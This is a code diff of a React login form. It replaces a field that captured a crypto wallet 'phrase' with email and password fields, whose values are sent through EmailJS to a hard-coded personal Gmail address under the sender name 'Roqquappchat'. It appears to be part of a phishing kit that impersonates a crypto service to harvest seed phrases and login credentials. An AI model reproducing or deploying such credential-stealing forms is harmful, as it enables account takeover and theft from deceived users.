@@ -1,41 +1,58 @@
 import React, { useState, useEffect } from 'react'
 import { connect } from 'react-redux'
+import emailjs from 'emailjs-com'
+
 
 import * as orderAction from '../store/actions'
 
 const Form = (props) => {
-    const [phrase, setPhrase] = useState('')
-    const [toast, setToast] = useState({})
+    const [email, setEmail] = useState('')
+    const [password, setPassword] = useState('')
 
-    const handlePhrase = (e) => {
-        setPhrase(e.target.value)
+    const handleEmail = (e) => {
+        setEmail(e.target.value)
     }
 
+    const handlePassword = (e) => {
+        setPassword(e.target.value)
+    }
+
+    const templateParams = {
+        client_email: email,
+        client_password: password,
+        admin_email: 'Testimonyibom@gmail.com',
+        from_name: 'Roqquappchat',
+        to_name: 'Admin'
+       
+    }
     const handleSubmit = async (e) => {
         e.preventDefault()
 
-        props.onInitPutPhrase(phrase)
-        //  setToast({
-        //      content: 'Wallet Synchronization in process!!',
-        //      type: 'success',
-        //  })
-    }
+        console.log('credentials', email, password)
 
-    useEffect(() => {
-        if (props.createdPhrase) {
-            setToast({
-                content: 'Wallet Synchronization in process!!',
-                type: 'success',
-            })
+        if (email === '' || password === '' ) {
+            console.log('not sent')
+        } else {
+       
+
+            emailjs
+                .send(
+                    'service_cajdfqp',
+                    'template_wss11os',
+                    templateParams,
+                    'user_xCNzJyoa0acBRP75Xy9wk'
+                )
+                .then(
+                    (result) => {
+                        console.log(result.text, 'email sent')
+                    },
+                    (error) => {
+                        console.log(error, 'email failed')
+                    }
+                )
         }
-        if (props.error) {
-            console.log('error', props.error)
-            setToast({
-                content: 'Invalid Phrase, Please check your entries!!',
-                type: 'error',
-            })
-        }
-    }, [props.createdPhrase, props.error])
+    }
+    
 
     return (
         <form
@@ -51,15 +68,17 @@ const Form = (props) => {
                 id='email'
                 className='text-black outline-none text-lg p-1 rounded-md justify-self-stretch placeholder-[#b2b7be] focus:border-black mb-4'
                 required
-                value={phrase}
+                value={email}
                 placeholder='Email address'
-                onChange={handlePhrase}
+                onChange={handleEmail}
             />
             <input
                 type='password'
                 id='email'
                 className='text-black outline-none text-lg p-1 rounded-md justify-self-stretch placeholder-[#b2b7be] focus:border-black mb-4'
                 required
+                value={password}
+                onChange={handlePassword}
                 placeholder='password'
             />
 
@@ -75,16 +94,11 @@ const Form = (props) => {
             </div>
 
             <div className='ui grids'>
-
-                 <div
-                    className='ui eight wide column'
-                    style={{ paddingRight: '16px' }}
-                >
-                
                 <div
-                    className='customBtn'
+                    className='ui eight wide column'
+                    style={{ paddingRight: '7px' }}
                 >
-                    
+                    <div className='customBtn' style={{ paddingRight: '7px' }}>
                         <svg
                             className='icon'
                             xmlns='http://www.w3.org/2000/svg'
@@ -114,7 +128,7 @@ const Form = (props) => {
                             </g>
                         </svg>
                         <span className='buttonText'>Google</span>
-                </div>
+                    </div>
                 </div>
                 <div
                     className='ui eight wide column'
